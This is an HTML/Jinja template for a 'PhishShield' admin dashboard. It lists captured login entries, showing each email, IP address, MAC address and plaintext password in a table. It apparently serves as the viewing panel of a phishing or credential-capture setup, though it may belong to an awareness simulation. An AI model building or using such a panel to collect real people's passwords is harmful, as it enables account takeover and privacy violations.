<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Admin Dashboard | PhishShieldâ„¢</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #f4f6f9;
      font-family: 'Segoe UI', sans-serif;
    }
    .dashboard-container {
      margin: 40px auto;
      max-width: 1000px;
      padding: 20px;
      background: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 12px;
    }
    .table th, .table td {
      vertical-align: middle;
    }
    .table-hover tbody tr:hover {
      background-color: #f1f3f5;
    }
    .dashboard-title {
      margin-bottom: 30px;
      font-weight: bold;
      text-align: center;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="dashboard-container">
    <h1 class="dashboard-title">Admin Dashboard</h1>

    <div class="table-responsive">
      <table class="table table-bordered table-hover table-striped align-middle">
        <thead class="table-dark">
          <tr>
            <th>Email</th>
            <th>IP Address</th>
            <th>MAC Address</th>
            <th>Password</th>
          </tr>
        </thead>
        <tbody>
          {% for key, entry in login_data.items() %}
          <tr>
            <td>{{ entry.email }}</td>
            <td>{{ entry.ip }}</td>
            <td>{{ entry.mac }}</td>
            <td>{{ entry.password if entry.password else 'N/A' }}</td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
  </div>
  <a href="/logout" class="btn btn-danger" style=" top: 10px; left: 10px;">
  Logout
  </a>

</body>
</html>
